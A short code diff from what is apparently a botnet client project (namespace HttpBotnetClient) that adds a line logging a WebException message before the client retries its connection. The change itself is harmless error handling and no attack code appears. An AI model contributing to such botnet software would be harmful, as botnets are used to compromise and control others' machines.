@@ -56,6 +56,7 @@ namespace HttpBotnetClient
                 }
                 catch (WebException we)
                 {
+                    Console.WriteLine(we.Message);
                     Console.Write("WebException caught, trying again in 3 seconds");
                     clientSleep(3);
                     continue;  // Do it again
